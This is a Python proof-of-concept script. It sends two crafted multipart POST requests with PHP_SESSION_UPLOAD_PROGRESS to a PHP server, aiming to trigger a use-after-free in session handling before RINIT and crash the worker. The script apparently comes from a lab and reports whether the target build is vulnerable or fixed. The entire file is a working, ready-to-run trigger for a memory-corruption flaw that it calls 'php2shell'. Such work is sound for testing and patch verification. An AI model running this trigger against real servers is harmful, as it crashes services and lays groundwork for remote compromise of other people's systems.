#!/usr/bin/env python3
"""Two-request trigger for the php2shell pre-RINIT state-corruption path.

R1 (arm): a multipart POST that carries PHP_SESSION_UPLOAD_PROGRESS and a
          file part, using a session ID whose session file is already large.
          PHP parses the body in php_hash_environment(), before RINIT, and the
          session decode/encode inside php_session_rfc1867_* hits memory_limit.
          On a vulnerable build the OOM bailout leaves the serialization
          context allocated but pointing at freed memory.

R2 (probe): a second progress upload in the same worker/process. The handler
          re-enters php_session_initialize() before RINIT and reuses the stale
          context -> crash (vulnerable) or clean response (fixed).

usage: trigger.py <host> <port> <arm_sid> <probe_sid> [timeout]
"""
import socket
import sys
import time

BOUNDARY = "----php2shell-lab"


def progress_upload(host: str, port: int, sid: str, timeout: float = 25.0) -> bytes:
    body = (
        f"--{BOUNDARY}\r\n"
        'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
        "x\r\n"
        f"--{BOUNDARY}\r\n"
        'Content-Disposition: form-data; name="f"; filename="a.txt"\r\n\r\n'
        "Z\r\n"
        f"--{BOUNDARY}--\r\n"
    ).encode()
    req = (
        f"POST /index.php HTTP/1.1\r\nHost: {host}\r\n"
        f"Content-Type: multipart/form-data; boundary={BOUNDARY}\r\n"
        f"Content-Length: {len(body)}\r\nConnection: close\r\n"
        f"Cookie: PHPSESSID={sid}\r\n\r\n"
    ).encode()
    sock = socket.create_connection((host, port), timeout=timeout)
    try:
        sock.sendall(req + body)
        sock.settimeout(timeout)
        data = b""
        while True:
            chunk = sock.recv(65536)
            if not chunk:
                break
            data += chunk
        return data
    finally:
        sock.close()


def describe(label: str, data: bytes) -> None:
    if not data:
        print(f"{label}: <no response / process aborted>")
        return
    first = data.split(b"\r\n", 1)[0].decode("latin1", "replace")
    body = data.split(b"\r\n\r\n", 1)[-1][:160]
    print(f"{label}: {first}")
    if body:
        print(f"    body: {body!r}")


def main() -> int:
    if len(sys.argv) < 5:
        print(__doc__)
        return 2
    host, port = sys.argv[1], int(sys.argv[2])
    arm_sid, probe_sid = sys.argv[3], sys.argv[4]
    timeout = float(sys.argv[5]) if len(sys.argv) > 5 else 25.0

    describe("R1 arm  ", progress_upload(host, port, arm_sid, timeout))
    time.sleep(0.4)
    describe("R2 probe", progress_upload(host, port, probe_sid, timeout))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
